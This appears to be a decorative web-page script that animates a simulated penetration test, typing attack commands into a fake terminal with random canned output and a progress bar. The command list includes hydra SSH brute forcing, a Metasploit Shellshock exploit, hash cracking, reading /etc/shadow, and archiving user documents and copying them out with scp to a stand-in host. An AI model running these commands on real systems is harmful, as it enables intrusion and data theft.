// System Penetration Simulation
document.addEventListener('DOMContentLoaded', function() {
    initPenetrationSimulation();
});

// Initialize penetration test simulation
function initPenetrationSimulation() {
    // Elements
    const penetrationStatus = document.querySelector('.penetration-status');
    const penetrationTerminal = document.querySelector('.penetration-terminal');
    const progressFill = document.querySelector('.penetration-progress-fill');
    const progressText = document.querySelector('.penetration-progress-text');
    
    // Skip if elements don't exist
    if (!penetrationStatus || !penetrationTerminal || !progressFill || !progressText) return;
    
    // Start penetration simulation
    setTimeout(() => {
        simulatePenetration();
    }, 3000);
    
    // Simulate penetration test
    function simulatePenetration() {
        // Penetration test phases
        const phases = [
            { 
                name: "Reconnaissance", 
                steps: [
                    "nmap -A -T4 target_system",
                    "dig +short target_system MX",
                    "whois target_domain",
                    "enum4linux -a target_system"
                ] 
            },
            { 
                name: "Scanning & Enumeration", 
                steps: [
                    "dirb https://target_system /usr/share/wordlists/dirb/common.txt",
                    "nikto -h target_system",
                    "nmap -p- -sV target_system",
                    "wpscan --url target_system"
                ] 
            },
            { 
                name: "Vulnerability Assessment", 
                steps: [
                    "searchsploit apache 2.4.41",
                    "nmap --script vuln target_system",
                    "openvas-start target_system",
                    "sqlmap -u target_system/page.php?id=1 --dbs"
                ] 
            },
            { 
                name: "Exploitation", 
                steps: [
                    "hydra -l admin -P /usr/share/wordlists/rockyou.txt target_system ssh",
                    "msfconsole -q -x \"use exploit/multi/http/apache_mod_cgi_bash_env; set RHOSTS target_system; exploit\"",
                    "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
                    "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt"
                ] 
            },
            { 
                name: "Escalating Privileges", 
                steps: [
                    "find / -perm -u=s -type f 2>/dev/null",
                    "sudo -l",
                    "uname -a | grep \"Linux\"",
                    "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
                ] 
            },
            { 
                name: "Access Granted", 
                steps: [
                    "cat /etc/shadow",
                    "echo \"ACCESS GRANTED\"",
                    "tar -cvf data.tar /home/user/Documents/",
                    "scp data.tar remote_system:/tmp/"
                ] 
            }
        ];
        
        let phaseIndex = 0;
        let stepIndex = 0;
        let progress = 0;
        
        // Update status with current phase
        penetrationStatus.textContent = `Phase: ${phases[phaseIndex].name}`;
        
        // Process next step
        function processNextStep() {
            if (phaseIndex >= phases.length) {
                // Completed all phases
                penetrationStatus.textContent = "System access successful";
                penetrationStatus.style.color = "#f43f5e";
                penetrationStatus.style.animation = "none";
                return;
            }
            
            // Get current phase and step
            const currentPhase = phases[phaseIndex];
            
            if (stepIndex >= currentPhase.steps.length) {
                // Move to next phase
                phaseIndex++;
                stepIndex = 0;
                
                if (phaseIndex < phases.length) {
                    penetrationStatus.textContent = `Phase: ${phases[phaseIndex].name}`;
                }
                
                setTimeout(processNextStep, 800);
                return;
            }
            
            // Get current step command
            const command = currentPhase.steps[stepIndex];
            
            // Add command to terminal with typing effect
            addCommandToTerminal(command, () => {
                // Add response after command is typed
                addResponseToTerminal(() => {
                    // Update progress
                    const totalSteps = phases.reduce((total, phase) => total + phase.steps.length, 0);
                    const completedSteps = phases.slice(0, phaseIndex).reduce((total, phase) => total + phase.steps.length, 0) + stepIndex + 1;
                    
                    progress = Math.floor((completedSteps / totalSteps) * 100);
                    progressFill.style.width = `${progress}%`;
                    progressText.textContent = `${progress}%`;
                    
                    // Move to next step
                    stepIndex++;
                    setTimeout(processNextStep, 800);
                });
            });
        }
        
        // Add command to terminal with typing effect
        function addCommandToTerminal(command, callback) {
            const commandElement = document.createElement('div');
            commandElement.innerHTML = '<span style="color: #10b981;">root@system:~#</span> ';
            penetrationTerminal.appendChild(commandElement);
            
            let i = 0;
            function typeCommand() {
                if (i < command.length) {
                    commandElement.innerHTML += command.charAt(i);
                    i++;
                    setTimeout(typeCommand, 30 + Math.random() * 30);
                } else {
                    if (callback) callback();
                }
            }
            
            setTimeout(typeCommand, 200);
        }
        
        // Add response to terminal
        function addResponseToTerminal(callback) {
            // Simulate thinking
            setTimeout(() => {
                // Generate random response
                const responseLines = Math.floor(Math.random() * 2) + 1;
                let response = '';
                
                for (let i = 0; i < responseLines; i++) {
                    response += generateRandomResponse() + '<br>';
                }
                
                // Add response
                const responseElement = document.createElement('div');
                responseElement.innerHTML = response;
                responseElement.style.fontSize = '9px';
                responseElement.style.color = '#a0aec0';
                penetrationTerminal.appendChild(responseElement);
                
                // Scroll to bottom
                penetrationTerminal.scrollTop = penetrationTerminal.scrollHeight;
                
                if (callback) callback();
            }, 400 + Math.random() * 300);
        }
        
        // Generate random response
        function generateRandomResponse() {
            const responses = [
                "[+] Target identified: 192.168.1.x",
                "[*] Scanning ports 1-65535...",
                "[!] Vulnerability detected: CVE-2021-xxxx",
                "[-] Connection attempt failed, retrying...",
                "[+] Found 3 potential entry points",
                "[*] Analyzing system architecture...",
                "[+] Success! Password hash obtained",
                "[*] Testing exploit vectors...",
                "[!] Warning: Intrusion detection active",
                "[+] Bypassed security layer 1/3",
                "[*] Sending payload to target...",
                "[+] Escalated to root privileges",
                "[*] Establishing secure connection...",
                "[!] Firewall rule detected, evading...",
                "[+] Access granted to /etc/shadow",
                "[*] Searching for sensitive data..."
            ];
            
            return responses[Math.floor(Math.random() * responses.length)];
        }
        
        // Start the penetration simulation
        processNextStep();
    }
}
